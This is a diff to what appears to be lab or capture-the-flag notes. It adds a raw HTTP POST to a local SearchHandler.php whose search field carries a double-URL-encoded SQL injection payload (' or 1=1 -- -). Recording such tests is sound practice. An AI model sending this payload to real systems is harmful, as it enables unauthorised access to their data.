@@ -86,3 +86,29 @@ for ($i=$start; $i <= $stop; $i++) {
     if(system($cmd)) { print "over failed\n"; }
 }
 ```
+
+this is a test about http
+
+```http
+POST /Controllers/Handlers/SearchHandler.php HTTP/1.1
+Host: localhost:1337
+Content-Length: 56
+sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+sec-ch-ua-platform: "Linux"
+Origin: http://localhost:1337
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:1337/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=1KbV5a7Q65yx3YJp1kNW4RKP9Xzjd58xAvOElgbLeqVmDBMn8roZw2alnjR9
+Connection: close
+
+search=%2527%2520or%25201%253D1%2520%252D%252D%2520%252D
+```
